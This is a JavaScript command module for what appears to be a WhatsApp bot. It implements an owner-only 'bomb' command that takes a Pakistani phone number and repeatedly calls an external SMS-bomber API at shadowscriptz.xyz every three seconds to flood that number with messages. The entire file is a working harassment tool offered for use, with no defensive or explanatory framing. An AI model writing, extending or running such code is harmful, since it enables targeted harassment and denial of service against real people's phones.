const { cmd } = require('../command');
let isBombing = false;
let bombingInterval;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start/Stop SMS Bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    if (!isOwner) return reply("❌ Owner only!");

    // STOP if already running
    if (isBombing) {
        clearInterval(bombingInterval);
        isBombing = false;
        return reply("✅ Bombing stopped!");
    }

    // START Logic
    const args = text.split(' ');
    const number = args[1]?.replace(/[^0-9]/g, '');
    if (!number || !number.startsWith('92')) {
        return reply("❌ Invalid PK number! Usage: !bomb 923001234567 [count=10]");
    }

    const count = parseInt(args[2]) || 10; // Default 10 SMS
    isBombing = true;
    let sent = 0;

    reply(`💣 *Bombing Started!*\nNumber: ${number}\nCount: ${count}`);

    bombingInterval = setInterval(async () => {
        if (!isBombing || sent >= count) {
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`✅ Sent ${sent}/${count} SMS!`);
            return;
        }

        try {
            const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
            const response = await fetch(apiUrl);
            
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            sent++;
            
        } catch (err) {
            console.error("Error:", err);
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`❌ Failed: ${err.message}`);
        }
    }, 3000); // 3-second delay
});
